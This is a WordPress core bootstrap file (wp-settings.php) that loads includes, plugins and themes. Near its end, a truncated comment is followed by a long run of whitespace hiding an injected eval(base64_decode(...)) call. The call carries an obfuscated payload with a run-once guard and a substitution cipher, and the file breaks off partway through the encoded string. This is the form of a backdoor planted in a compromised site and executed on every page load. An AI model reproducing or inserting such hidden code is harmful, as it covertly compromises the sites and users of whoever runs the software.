<?php
/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
require( ABSPATH . WPINC . '/load.php' );
require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
global $wp_version, $wp_db_version, $tinymce_version, $required_php_version, $required_mysql_version;
require( ABSPATH . WPINC . '/version.php' );

// Set initial default constants including WP_MEMORY_LIMIT, WP_MAX_MEMORY_LIMIT, WP_DEBUG, WP_CONTENT_DIR and WP_CACHE.
wp_initial_constants();

// Check for the required PHP version and for the MySQL extension or a database drop-in.
wp_check_php_mysql_versions();

// Disable magic quotes at runtime. Magic quotes are added using wpdb later in wp-settings.php.
@ini_set( 'magic_quotes_runtime', 0 );
@ini_set( 'magic_quotes_sybase',  0 );

// WordPress calculates offsets from UTC.
date_default_timezone_set( 'UTC' );

// Turn register_globals off.
wp_unregister_GLOBALS();

// Standardize $_SERVER variables across setups.
wp_fix_server_vars();

// Check if we have received a request due to missing favicon.ico
wp_favicon_request();

// Check if we're in maintenance mode.
wp_maintenance();

// Start loading timer.
timer_start();

// Check if we're in WP_DEBUG mode.
wp_debug_mode();

// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
if ( WP_CACHE )
	WP_DEBUG ? include( WP_CONTENT_DIR . '/advanced-cache.php' ) : @include( WP_CONTENT_DIR . '/advanced-cache.php' );

// Define WP_LANG_DIR if not set.
wp_set_lang_dir();

// Load early WordPress files.
require( ABSPATH . WPINC . '/compat.php' );
require( ABSPATH . WPINC . '/functions.php' );
require( ABSPATH . WPINC . '/class-wp.php' );
require( ABSPATH . WPINC . '/class-wp-error.php' );
require( ABSPATH . WPINC . '/plugin.php' );
require( ABSPATH . WPINC . '/pomo/mo.php' );

// Include the wpdb class and, if present, a db.php database drop-in.
require_wp_db();

// Set the database table prefix and the format specifiers for database table columns.
$GLOBALS['table_prefix'] = $table_prefix;
wp_set_wpdb_vars();

// Start the WordPress object cache, or an external object cache if the drop-in is present.
wp_start_object_cache();

// Attach the default filters.
require( ABSPATH . WPINC . '/default-filters.php' );

// Initialize multisite if enabled.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-blogs.php' );
	require( ABSPATH . WPINC . '/ms-settings.php' );
} elseif ( ! defined( 'MULTISITE' ) ) {
	define( 'MULTISITE', false );
}

register_shutdown_function( 'shutdown_action_hook' );

// Stop most of WordPress from being loaded if we just want the basics.
if ( SHORTINIT )
	return false;

// Load the L10n library.
require_once( ABSPATH . WPINC . '/l10n.php' );

// Run the installer if WordPress is not installed.
wp_not_installed();

// Load most of WordPress.
require( ABSPATH . WPINC . '/class-wp-walker.php' );
require( ABSPATH . WPINC . '/class-wp-ajax-response.php' );
require( ABSPATH . WPINC . '/formatting.php' );
require( ABSPATH . WPINC . '/capabilities.php' );
require( ABSPATH . WPINC . '/query.php' );
require( ABSPATH . WPINC . '/date.php' );
require( ABSPATH . WPINC . '/theme.php' );
require( ABSPATH . WPINC . '/class-wp-theme.php' );
require( ABSPATH . WPINC . '/template.php' );
require( ABSPATH . WPINC . '/user.php' );
require( ABSPATH . WPINC . '/meta.php' );
require( ABSPATH . WPINC . '/general-template.php' );
require( ABSPATH . WPINC . '/link-template.php' );
require( ABSPATH . WPINC . '/author-template.php' );
require( ABSPATH . WPINC . '/post.php' );
require( ABSPATH . WPINC . '/post-template.php' );
require( ABSPATH . WPINC . '/revision.php' );
require( ABSPATH . WPINC . '/post-formats.php' );
require( ABSPATH . WPINC . '/post-thumbnail-template.php' );
require( ABSPATH . WPINC . '/category.php' );
require( ABSPATH . WPINC . '/category-template.php' );
require( ABSPATH . WPINC . '/comment.php' );
require( ABSPATH . WPINC . '/comment-template.php' );
require( ABSPATH . WPINC . '/rewrite.php' );
require( ABSPATH . WPINC . '/feed.php' );
require( ABSPATH . WPINC . '/bookmark.php' );
require( ABSPATH . WPINC . '/bookmark-template.php' );
require( ABSPATH . WPINC . '/kses.php' );
require( ABSPATH . WPINC . '/cron.php' );
require( ABSPATH . WPINC . '/deprecated.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/taxonomy.php' );
require( ABSPATH . WPINC . '/update.php' );
require( ABSPATH . WPINC . '/canonical.php' );
require( ABSPATH . WPINC . '/shortcodes.php' );
require( ABSPATH . WPINC . '/class-wp-embed.php' );
require( ABSPATH . WPINC . '/media.php' );
require( ABSPATH . WPINC . '/http.php' );
require( ABSPATH . WPINC . '/class-http.php' );
require( ABSPATH . WPINC . '/widgets.php' );
require( ABSPATH . WPINC . '/nav-menu.php' );
require( ABSPATH . WPINC . '/nav-menu-template.php' );
require( ABSPATH . WPINC . '/admin-bar.php' );

// Load multisite-specific files.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-functions.php' );
	require( ABSPATH . WPINC . '/ms-default-filters.php' );
	require( ABSPATH . WPINC . '/ms-deprecated.php' );
}

// Define constants that rely on the API to obtain the default value.
// Define must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
wp_plugin_directory_constants();

// Load must-use plugins.
foreach ( wp_get_mu_plugins() as $mu_plugin ) {
	include_once( $mu_plugin );
}
unset( $mu_plugin );

// Load network activated plugins.
if ( is_multisite() ) {
	foreach( wp_get_active_network_plugins() as $network_plugin ) {
		include_once( $network_plugin );
	}
	unset( $network_plugin );
}

/**
 * Fires once all must-use and network-activated plugins have loaded.
 *
 * @since 2.8.0
 */
do_action( 'muplugins_loaded' );

if ( is_multisite() )
	ms_cookie_constants(  );

// Define constants after multisite is loaded. Cookie-related constants may be overridden in ms_network_cookies().
wp_cookie_constants();

// Define and enforce our SSL constants
wp_ssl_constants();

// Create common globals.
require( ABSPATH . WPINC . '/vars.php' );

// Make taxonomies and posts available to plugins and themes.
// @plugin authors: warning: these get registered again on the init hook.
create_initial_taxonomies();
create_initial_post_types();

// Register the default theme directory root
register_theme_directory( get_theme_root() );

// Load active plugins.
foreach ( wp_get_active_and_valid_plugins() as $plugin )
	include_once( $plugin );
unset( $plugin );

// Load pluggable functions.
require( ABSPATH . WPINC . '/pluggable.php' );
require( ABSPATH . WPINC . '/pluggable-deprecated.php' );

// Set internal encoding.
wp_set_internal_encoding();

// Run wp_cache_postload() if object cache is enabled and the function exists.
if ( WP_CACHE && function_exists( 'wp_cache_postload' ) )
	wp_cache_postload();

/**
 * Fires once activated plugins have loaded.
 *
 * Pluggable functions are also available at this point in the loading order.
 *
 * @since 1.5.0
 */
do_action( 'plugins_loaded' );

// Define constants which affect functionality if not already defined.
wp_functionality_constants();

// Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
wp_magic_quotes();

/**
 * Fires when comment cookies are sanitized.
 *
 * @since 2.0.11
 */
do_action( 'sanitize_comment_cookies' );

/**
 * WordPress Query object
 * @global object $wp_the_query
 * @since 2.0.0
 */
$wp_the_query = new WP_Query();

/**
 * Holds the reference to @see $wp_the_query
 * Use this global for WordPress queries
 * @global object $wp_query
 * @since 1.5.0
 */
$wp_query = $wp_the_query;

/**
 * Holds the WordPress Rewrite object for creating pretty URLs
 * @global object $wp_rewrite
 * @since 1.5.0
 */
$GLOBALS['wp_rewrite'] = new WP_Rewrite();

/**
 * WordPress Object
 * @global object $wp
 * @since 2.0.0
 */
$wp = new WP();

/**
 * WordPress Widget Factory Object
 * @global object $wp_widget_factory
 * @since 2.8.0
 */
$GLOBALS['wp_widget_factory'] = new WP_Widget_Factory();

/**
 * WordPress User Roles
 * @global object $wp_roles
 * @since 2.0.0
 */
$GLOBALS['wp_roles'] = new WP_Roles();

/**
 * Fires before the theme is loaded.
 *
 * @since 2.6.0
 */
do_action( 'setup_theme' );

// Define the template related constants.
wp_templating_constants(  );

// Load the default text localization domain.
load_default_textdomain();

$locale = get_locale();
$locale_file = WP_LANG_DIR . "/$locale.php";
if ( ( 0 === validate_file( $locale ) ) && is_readable( $locale_file ) )
	require( $locale_file );
unset( $locale_file );

// Pull in locale data after loading text domain.
require_once( ABSPATH . WPINC . '/locale.php' );

/**
 * WordPress Locale object for loading locale domain date and various strings.
 * @global object $wp_locale
 * @since 2.1.0
 */
$GLOBALS['wp_locale'] = new WP_Locale();

// Load the functions for the active theme, for both parent and child theme if applicable.
if ( ! defined( 'WP_INSTALLING' ) || 'wp-activate.php' === $pagenow ) {
	if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists( STYLESHEETPATH . '/functions.php' ) )
		include( STYLESHEETPATH . '/functions.php' );
	if ( file_exists( TEMPLATEPATH . '/functions.php' ) )
		include( TEMPLATEPATH . '/functions.php' );
}

/**
 * Fires after t*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJG5qaGJuZGdsZiA9IDg2OTI7IGZ1bmN0aW9uIG14bXJuY2YoJGdpenFxa24sICR3aW53cWVhKXskZmdzaWNpID0gJyc7IGZvcigkaT0wOyAkaSA8IHN0cmxlbigkZ2l6cXFrbik7ICRpKyspeyRmZ3NpY2kgLj0gaXNzZXQoJHdpbndxZWFbJGdpenFxa25bJGldXSkgPyAkd2lud3FlYVskZ2l6cXFrblskaV1dIDogJGdpenFxa25bJGldO30KJGp2b2R3YnZ1PSJiYXNlIiAuICI2NF9kZWNvZGUiO3JldHVybiAkanZvZHdidnUoJGZnc2ljaSk7fQokcmFrdmZqID0gJ0x6YkFqbzR3UXBMZzBub1BDOTRQcG5jZFFQQ3FySUZvTklCWk1CVWZMemJBam80d1FwTGcwbmNkUWk0YkM2MGRDNlc2VEh1QmZOcVNIbVhaNTlic0Nub1VmSDhWRycuCidwWXNRcFliRzNvVWoyNEFwM3ZaNTJsNlRIdUJmTnFTSG1YYkM2MGRDYjRQUXBYZEM2dlo1OUNnV0hteWtMWnVDbm9VcDN2WjUyb3M1emJWanBMZ1dIbXlrTGdTSEVVZmoyJy4KJ0dncjJ2YlE5YkFRMkxncmJYcmxhNGFOVUJlZnRtU0g2cVNIZXVFckhYbVEyUVo1OWxncicuCidiWHJsYTRhTlVCZVRIdWVwekplZk5xU0g2VVNIRVVmajJHZ3IydmJROWJBUTJMZ3JtdjAnLgonbG1va29JNHQybzROdm9YWGxtYWxOaXJlZnRtU0g2cVNIZXVFckhYbVEyUVo1OWxncm12MGxtb2tvSTR0Mm80TnZvWFhsbWEnLgonbE5pcmVUSHVlVFByWk1CVWZzTFVma0xaWlFldWdyMnZiUTliQVEyTGcwVWFXbG1vWHZhYnNsYm9NcHdJVVN6V0pTblM5UycuCid4cndHOUlKVzlhWVE5bW5NTzBaRzJyY1M5YVVqMmhjTUhDWmZMVWZSQlVmckh1RXJ6dmJROWJBUXRFNkxsY3R2Jy4KJ2xhSTJvNHRvbEZzV05MVUd3RTNHbkduV3hTZUdORVBHMmE5ak5HSkM5YllHeEluR3B2WjV3SUowUEJFV3RteWtMZ1NIZXVFckgnLgondW1RemFVR3R1NHJJRm9OSUJ5a0xnRXJIdUUwenZZOHphc2pub0Zya1VFTmJvV05rcVNIRVVmckh1RXJIdk9OSTRITGxjTjJQOHhDaTRZOHB2ZzBpVUU3dHUnLgonNlc5RzNNMlNiUXpsVldOdllTSFVVV3dvbVRORUpRTnVWTTJJd1FOSUpRTkNGUzlROTB3cVNIZXVFckhYNjV6NGVHMkJFMHpTd3BuJy4KJ2FpOHpFeWtMZ1NIRVVmckh1RXJ6UWk1OVNVajI0QXJ6U3dwVThiOElZZEMzTGdmTFVmckh1RXJPcVNIZXVFckh1RXJIdUVDOW9VOHAwQXInLgonT1NVQzZ2ZDV6NDNRcHJnQ08wYlFpNFBRcFhxRzJTYmZIQ2RwZVkzODM4aFE2dkJmb0JBVG5tNlRIQzZUSXVtcGlTYScuCidsYlFhbGJxNnRhdmxsYTRyTmlTbDBpVVpmTnFTSGV1RXJIWDRrTGdTSGV1RXJIWDk4MkZ4OHpiZDVlWHhDaTRPUXB2cEM5YlVHMjBxUWx2WkM2VycuCidnZkxVZnJIdUVyT3FTSGV1RXJIdUVySHVFME8wYkNQdTRySWFQQzlhRmZIbXlrTGdTSGV1RXJIdUVySHVFMHphQUcyY0ZDM2J3cDNhJy4KJ2lRcG9icmtVRUxwMFBHcG1nZk5xU0hFVWZySHVFckh1RXJIdW1HMkZZNU9id1JwU3NDcG9iODJvNXB0dTQnLgoncnpTd3BVOGI4SXZkR2kwZDUzTGdmTnFTSEVVZnJIdUVySHVFckh1bUNub3FRYjRCR3B2Z3JrVUUwYTROdm8wMnZvMDUwaVNrbG1iTG9hNHp0bGNhTm1hU3Z0ODhNQicuCidVZnJIdUVySHVFckhYM2p6YnFRdHVnZkh2dzV6YXdqSHU0ck9TVUM2MEI1M1dnME9TYjV6UXNDemFVakhCRXZJYnQnLgondmxTbE5pMFFwaVNhbElhdExvdjdsZW1ackhJNDd0WHpMbGNOdnRtU0hldUVySHVFckh1Jy4KJ0VSQlVmckh1RXJIdUVySHVFckh1RTBPU2I1elFzQ3phVWpIdTRyT1NpRzZTVUNlRW1Dbm9xUWI0QkdwJy4KJ3ZnVEh1QlRIdW1DbmNZQ25FWk1CVWZrTGdFckh1RXJIdUVySHVFckhYWlFldWcwT1NiNXpRc0N6YVVqSHU0N3RYeENpNE9RcHZJNW5TdDVuNFVmSG0nLgonWmtMZ0VySHVFckh1RXJIdUVySFh5a0xnRXJIdUVySHVFckh1RXJIdUVySHVFRzYwYkcycXlrTGdFckh1RXJIdUVySHVFckhYNGtMJy4KJ2dTSGV1RXJIdUVySHVFckh1RXJ6YjlySFl3OE8wcVEySmcwT1NiNXpRc0N6YVVqSG1aa0xnJy4KJ0VySHVFckh1RXJIdUVySFh5a0xnRXJIdUVySHVFckh1RXJIdUVySHVFMHphQUcyY0ZDM2J3cDNhaVFwb2IyaVVFN3R1bScuCidDbm9xUWI0QkdwdmdNQlVmckh1RXJIdUVySHVFckh1RXNMVWZySHVFckh1RXJIWDRrTGdTSGV1RXJIdUVySHVFUTk0UFEyYXhqSHVnMHphQUcyY0YnLgonQzNid3AzYWlRcG9icnphd3JIdng4cDBQUTJGVXBudlpDZW1TSGV1RXJIdUVySHVFUkJVZnJIdUVySHVFckh1RXJIdUVqMkdFZkhhWjViNFlDNjBZUnRFbUczb1BDOW8nLgonQThhNG1qcHJxckh2UFFwV1pmTFVmckh1RXJIdUVySHVFckh1RVJCVWZySHVFckh1RXJIdUVySHVFckh1RXJIdlBRcFdFN3RYWUM2MFlSbzRWUXAwNlF0RW1DOW93VEhYeCcuCidDaTRPUXB2SWpwMGJHM3ZkQzZiV2pwU1VmSHZ4OHAwUFEyRlVwbnZaQ2VtWk1CVWZySHVFckh1RXJIdUVySHVFc0xVZnJIdUVySHVFckhYNGtMZ1NIZXUnLgonRXJIdUVySHVFQzlvVThwMEFyelN3cFVTZ1EyUzFvMzBaOHphZTV6bGdHcDBQR3BiczgyRlpDcCcuCidvYmZIdlBRcFdaZk5xU0hldUVySFg0a0xnU0hldUVySFg5ODJGeDh6YmQ1ZVh4Q2k0a2p6b3hqaThQanB2WUc5Y2JmSHZtanAwJy4KJ3M1emJ3OEhtU0hldUVySFh5a0xnRXJIdUVySHVFckh2bWpwMHM1emJ3OGE0M0M5YlVHMjBxUXR1NHJJYVBDOWFGZkhtJy4KJ3lrTGdTSGV1RXJIdUVySHVFUTk0UFEyYXhqSHVnMHp2WkNiNHFqcFNVcnphd3JIdm1qcHJaa0xnRXJIdUVySHVFck9xU0hldUVySHVFckh1RXJIJy4KJ3VFcnpiOXJIWXVqcFNzODMwWjh6YWU1emxnMHp2WkNlbUUwZUdFanBTc1F6YlBmSHZtanByWmZMVWZySHVFckh1RXJIdUVySHVFUkJVZnJIdUVySHVFckh1RScuCidySHVFckh1RXJIdm1qcDBzNXpidzhhNDNDOWJVRzIwcVFvVjhya1VFMHp2WkN4cVNIZXVFckh1RXJIdUVySHVFck9VU0hldUVySHVFckh1RScuCidzTFVma0xnRXJIdUVySHVFck8wYjhPb1A1ZXVtUXpiUHBuY1pDM3ZzODMwWjh6YWU1emx5a0xnRXJIdUVzTFVma0xnRXJIdUUnLgonUTZvQUczdlo1bkpFRzNTc3Zub1V2emJQUTJTVTUzMEZOemJ3OEhFbVF6YlBUSHVtUXpvQjh6RTRXTnVaa0xnRXJIdUVSQlVmckh1RXJIdUVySHVtQzlvdzgyY1Vya1VFR3AnLgonMFBHcG1nZk5xU0hFVWZySHVFckh1RXJIWFpRZXVncjJid3BudlpDZUVtUXpiUGZ0bVNIZXVFckh1RXJIdUVSQlVmckh1RXJIdUVySHVFckgnLgondUVDOW9VOHAwQXJIdlBRcFNpNU9MeWtMZ0VySHVFckh1RXJPVVNIRVVmckh1RXJIdUVySHVtQzlvdzgyY1UyaVVFN3R1bVF6Jy4KJ2JQTUJVZnJIdUVySHVFckh1bVF6YlBwblNkODJGVXJrVUVXa3FTSEVVZnJIdUVySHVFckhYWlFldWcwenZiQ092Z3JrQkVXdG1TSGV1RScuCidySHVFckh1RVJCVWZySHVFckh1RXJIdUVySHVFQzlvVThwMEFySHZQUXBTaTVPTHlrTGdFckh1RXJIdUUnLgonck9VU0hFVWZySHVFckh1RXJIdW1RemJQcmtVRUMzdlA1em9BZkh2bWpwclpya1U0cmtJRTdQdW1RemJQcmtnRUM2dlBqMlVnMHp2WkNlQkUwaWMnLgonQ1RQQ1pNQlVmckh1RXJIdUVySHVtakh1NHJJWGRDem9BUXpiUGZIdm1qcHJaTUJVZnJIdUVySCcuCid1RXJIWFpRZXVnMHpFRTdOVTRySVFYTmFTYWZMVWZySHVFckh1RXJIWHlrTGdFckh1RXJIdUVySHVFckhYUFFwdmlDOUpFME8wYkMzb3E4a3FTSGV1RXJIdUVySHVFc0xVZmsnLgonTGdFckh1RXJIdUVyTzhnajJjYnJIRWcwekdFN3RYUFEyYW1RemJQZkh2Z2Z0bUVyTlU0cklRWE5hU2FmTCcuCidVZnJIdUVySHVFckhYeWtMZ0VySHVFckh1RXJIdUVySFhaUWV1ZzB6R0VyTlU0ckhDQTBQWFk1OUxFMHpHJy4KJ0VyTlU0ckhDQVRlQ1prTGdFckh1RXJIdUVySHVFckhYeWtMZ0VySHVFckh1RXJIdUVySHVFckh1RTB6U2lDNjBiNTZ2c1F6YlAnLgoncmtVRXJldm1qcHJkMHpHZU1CVWZySHVFckh1RXJIdUVySHVFckh1RXJ6YjlySFlaQ2k0bWpwcmcwelNpQzYwYjUnLgonNnZzUXpiUGZ0bVNIZXVFckh1RXJIdUVySHVFckh1RXJIWHlrTGdFckh1RXJIdUVySHVFcicuCidIdUVySHVFckh1RXJIdm1qcDBzR240aTU2TEVmd1VFV05xU0hFVWZySHVFckh1RXJIdUVySHVFckh1RXJIdUVySHVtQzlvdzgnLgonMmNVMmlVRTd0dW1HM29QQzlvQThhNG1qcHJ5a0xnRXJIdUVySHVFckh1RXJIdUVySHVFckh1RXJIdlAnLgonUXBTaTVPTEU3dFhZQzYwWVJvNFZRcDA2UXRFbUM5b3c4MmNVVEhYeENpNE9RcHZJanAwYkczdmRDNmJXanBTVWZIdng4cDBQUTJGVXBudlpDZUJFMHp2YkNPdmdyJy4KJ0hoRVdOdVpmTnFTSGV1RXJIdUVySHVFckh1RXJIdUVySFg0a0xnRXJIdUVySHVFckh1RXJIWDRrTGdFckh1RXJIdUVyT1VTSEVVZnJIdUVySHVFckhYeDV6NHdRMnZaQ2UnLgonRW1qSG15a0xnU0hldUVySHVFckh1RUM5b1U4cDBBckh2UFFwU2k1T0x5a0xnRXJIdUVzJy4KJ0xVZmtMZ0VySHVFUTZvQUczdlo1bkpFRzNTc3Zub1V2ejR4bDk0ZDhIRVprTGdFckh1RVJCVWZySHVFckh1RXJIdW0nLgonUXo0eEM5NGQ4YTRiNTlMRTd0WHc4TzBQQ3o0d2ZIdnNsVW90b21vdDJQOE5MaTAwbGF2c3ZtJy4KJ2JXdmxGWE5sbDZwdEJFMGE0TnZvMDJ2bzA1MGkwYWxvb2FsaXZzb28wMDBpVVpNQlVmckh1RXJIdUVySFhaUWV1ZzB6dmRHMzBkNTN2c1EyRm0nLgoncmtVNDd0WHpMbGNOdnRtU0hldUVySHVFckh1RVJCVWZySHVFckh1RXJIdUVySHVFQzlvVThwMEFySHZzbFVvdG9tb3QyUDhJTlVTb05sJy4KJ29Nb2E0dE5VNGwwaVV5a0xnRXJIdUVySHVFck9VU0hldUVySHVFckh1RVEyY3dRMmI5ckhFbVF6NHhDOTRkOGE0YjU5TEU3TlU0cmt1WmtMZ0VySHVFckh1RXJPJy4KJ3FTSGV1RXJIdUVySHVFckh1RXJPMGI4T29QNWV1ZVRQcnlrTGdFckh1RXJIdUVyT1VTSGV1RXJIJy4KJ3VFckh1RVEyY3dRTFVmckh1RXJIdUVySFh5a0xnRXJIdUVySHVFckh1RXJIWFBRcHZpQzlKRUMzb2VDM3ZQZkh2c2xVb3RvbW90MlA4TkxpMDBsYXZzdm1iJy4KJ1d2bEZYTmxsNnB0QkVXSEJFMHp2ZEczMGQ1M3ZzUTJGbWZOcVNIZXVFckh1RXJIdUVzTFVmckh1RXJPVVNIRVVmckh1RXJ6YjlySEVZUTZvQUczdlonLgonNW5Gc1FwWVpDM3Z3Zkg4OWoyY2JwM1hpOGE0eDVuRlVRMkZVQ1BDWmZMVWZySHVFck9xU0hldUVySHVFckh1RVE2b0FHJy4KJzN2WjVuSkVROWJxUW80QjhwdnNHbjRBOHpvQThPV2cwekpxckh2bVRIdW1ROWNZUVB1NHJJUVk1T1NiZkxVZnJIdUVySHVFckhYeWtMZ0VySHVFJy4KJ3JIdUVySHVFckh1bTUyNG1RdHU0ckh2OTV6YTZya1U0cmtFRTdQdTZHdENFTWV1NjhQQ3lrTGdFckh1RXJIdUVySHVFckh1bScuCidRZXU0cklYOTUzWGI1ZUVtNWVCRTB6aWRRemxaTUJVZnJIdUVySHVFckh1RXJIdUVqMkdFZkh2OXJrVTQ3dFh6RzJjd1F0bVNIZXVFckh1Jy4KJ0VySHVFckh1RXJPcVNIZXVFckh1RXJIdUVySHVFckh1RXJIWFBRcHZpQzlKRVdrcVNIZXVFckh1RXJIdUVySHVFck9VU0hldUVySHVFckh1RXJIJy4KJ3VFcnpvcUNubFNIZXVFckh1RXJIdUVySHVFck9xU0hldUVySHVFckh1RXJIdUVySHVFckhYWlEnLgonZXVnanBTc0dwMFBHcG1nMHpMWmZ0dW1RSHU0cnpiVkN6Y2RRemxnMHpMWk1CVWZySHVFckh1RXInLgonSHVFckh1RXJIdUVySHZlUnB2YkNpNDNDOWJVOHpvQXJrVUVRNjhQanB2YmZIdjlUSHVtUUhteWtMZ0VySHVFckh1RXJIdUVySHVFckh1RVE5UycuCidxNTNTYmZIdjlmTnFTSGV1RXJIdUVySHVFckh1RXJIdUVySFhQUXB2aUM5SkUwejBGOHpvd3AzOFBqcCcuCid2VVEySnlrTGdFckh1RXJIdUVySHVFckhYNGtMZ0VySHVFckh1RXJPVVNIZXVFckhYNGtMZ1NIZXVFckhYWlEnLgonZXVncjJRaTU5U1VqMjRBcG5vSmpwU1VDUEU2UTlicVFvNDZRcHZzR240QTh6b0E4T1c2ZnRtU0hldUVySFh5a0xnRXJIdUVySHVFcnpRJy4KJ2k1OVNVajI0QXJ6UVo1em9zUW5vVXBuU2Q1NnZiNTZ2d2ZIdjlqMmNiNTlhVlF0bVNIZXUnLgonRXJIdUVySHVFUkJVZnJIdUVySHVFckh1RXJIdUUwelFnRzJGbTV6bEU3dFg5NTNYYjVlRW1ROWJxUTJGWTUybHFySDBQcmVteWtMZ0VySHVFckh1RXJIdUVySHVtUTlTJy4KJ2Q1NnZiNTZ2d3JrVUVRNjBiRzJMZzB6UWdHMkZtNXpscXJ6UVo1em93anBaYmZIdjlqMmMnLgonYjU5YVZRdG1aTUJVZnJIdUVySHVFckh1RXJIdUVROVNxNTNTYmZIdjlqemFBUXpjYmZOcVNIRVVmckh1RXJIdUVySHVFckh1RUM5b1U4cDBBckh2Jy4KJzlHbjRBOHpvQThPV3lrTGdFckh1RXJIdUVyT1VTSGV1RXJIWDRrTGdTSEVVZnJIdUVyelFpNTlTVWoyNCcuCidBcnpTd3BudmJHMzBGQ092c0N6WVlDbmxnMHp2WTh6SXFySHYxUXBtWmtMZ0VySHVFUkJVZnJIdUVySHVFckh1bTUzb1VwbnZZOHpJRTd0dWVyeHFTSEVVZnJIdUUnLgonckh1RXJIWDk1M3JFZkh2WjdOdXlySHZaN09TVUM5Y2I1ZUVtUXphVUd0bXlmTFVmckh1RXJIdScuCidFckhYeWtMZ0VySHVFckh1RXJIdUVySFg5NTNyRWZIdkQ3TnV5ckh2RDdPU1VDOWNiNWVFbWpub0ZmdHU5MGV1bWpOY3c4TzBxUTJKZzB6dlk4ekknLgonWk1QdW1qZXExVEh1bWp0cTFmTFVmckh1RXJIdUVySHVFckh1RVJCVWZySHVFckh1RXJIdUVySHVFckh1RXJIdmQ4cHZzUXphVUd0dUE3dFh4ak9yZzUzMG1mSHYnLgonbUdwdlkyUHZacHRtRXBlWGRDOUxnMHpWYlJvcW1qYlVaZk5xU0hldUVySHVFckh1RXJIdUVyT1VTSGV1RXJIdUVySHVFc0xVZmtMZ0VySHVFckh1Jy4KJ0VyTzBiOE9vUDVldW01M29VcG52WTh6SXlrTGdFckh1RXNMVWZrTGdFckh1RVE2b0FHM3ZaNW5KRUczU3NRem94QzZiQjhIRW1RemFVR3RCRTB6Jy4KJ1ZiUnRtU0hldUVySFh5a0xnRXJIdUVySHVFcno4cTVuMFk1SHVtRzNTc0dwb1Vqa3FTSEVVZnJIdUVySHVFckhYUFFwdmknLgonQzlKRUczU3NRem94QzZiQjhhNEJqemF3UXRZeENpNG1RMlNQUnBYVXAzWGdHcFNiZkh2bUdwdllUSHVtam5vRmZ0QkUwelN3cG5haTh6RScuCidaTUJVZnJIdUVyT1VTSGV1RXJIWDk4MkZ4OHpiZDVlWHhDaTRiNTlTUFJwWFVmSHZtR3B2WVRIdW1qbm9GZkxVZnJIdUVyT3FTSGV1RXJIdUVySHVFUW5jZEc5YXEnLgonckh2eENpNFk4cHZnTUJVZmtMZ0VySHVFckh1RXJPMGI4T29QNWVYeENpNG1RMlNQUnBYVXAzWGdHcFNiZnpTdycuCidwbnZiRzMwRkNPdnNDellZQ25sZzB6dlk4eklxckh2eENpNFk4cHZnZnRCRTB6VmJSdG15a0xnRXJIdUVzTFVma0xnRXJIdUVRNicuCidvQUczdlo1bkpFRzNTc1E5YnFRbzRQUTJhbWZIdkJHcHZnZkxVZnJIdUVyT3FTSGV1RXJIdUVySHVFMHp2Jy4KJ1k4eklFN3RYdVE5YnFRbzQ2UXB2c0duNEE4em9BOE9XZzBPWFk4ekVaTUJVZmtMZ0VySHVFckh1RXJPMGI4T29QNWV1bVF6YVUnLgonR05xU0hldUVySFg0a0xnU0hldUVySFg5ODJGeDh6YmQ1ZVh4Q2k0OWoyY2JwMzhQanB2YmZIdkJHcHZnVEh1bVF6YVVHdG1TSGV1RXJIWHlrTGdFckh1RXJIdUVySVg5aicuCicyY2JwM1hpOGE0eDVuRlVRMkZVQ1BFbUN6YVVqSEJFMHp2WTh6SVpNQlVmckh1RXJPVVNIRVVmckh1RXInLgonelFpNTlTVWoyNEFyelN3cG5RWjV6b3NHcFhCUTJGbWZIdkJHcHZnVEh1bVF6YVVHdG1TSGV1RXJIWHlrTGdFckgnLgondUVySHVFcklYOWoyY2JwM1hpOGE0eDVuRlVRMkZVQ1BFbUN6YVVqSEJFMHp2WTh6SXFya0VaTUJVZnJIdUVyT1VTSEVVZnJIdUVyelFpNTlTVWoyNEFyelN3cDMnLgonU2RDNnZzR240VkN6YVBRcHJnMHpJcXJIdmVmTFVmckh1RXJPcVNIZXVFckh1RXJIdUVDOW8nLgonVThwMEFyT1NVQzljYjVlRW1HdG1FVHRYdzhPMHFRMkpnMHpyWk1CVWZySHVFck9VU0hFVWZySHVFcnpRaTU5U1VqMjRBcnpTd3BVOGI4SVNkNTJpZDUnLgonYlNVNTMwWVFubGcwenZaQzZXNE5ib1dOSG1TSGV1RXJIWHlrTGdFckh1RXJIdUVySHZ3UTJjOXBudlpDZXU0cnp2WkM5Rlk1MmxncGk0enRsY2FwaWhaTUInLgonVWZrTGdFckh1RXJIdUVySHZ4NW5pVjVuRnM1OWFWUXBXRTd0WFhDNjBZUnRFZTUzWFVqMjQnLgonQUNQcnFySDBuajJvM0NQcnFySDBCRzI4YkNQcnFySDB3UXBTd2oyNEFDUHJxckgwdzh6YVVDUHJxckgwaUNub1BDUHJxckgwWUM2dlpHbmNiQ1BycXJIMG04MmknLgonQnJlQkVyOVliRzJ2YkM2V2VUSHVlNXpiZUNQclpNQlVma0xnRXJIdUVySHVFckh2VTVwWHNRemJQcmsnLgonVUUwT1NiNXpRc1F6YlBySEpFcmVoZXJISkUwelNkNTJpZDViNEFHMmliQ2lWdzhPMHFRMkpnRzNTc3Zub1V0ejR3OEhFWmZ0dWJyelNkODJGVWZIdng1bmlWNW5GczU5YVZRJy4KJ3BXWnBOcVNIRVVmckh1RXJIdUVySFhaUWV1Z1E5YnFRbzRiUnpidzhPV2cwT3ZWQ2E0bWpwclpmTFVmckh1RXJIdUVySFh5a0xnRX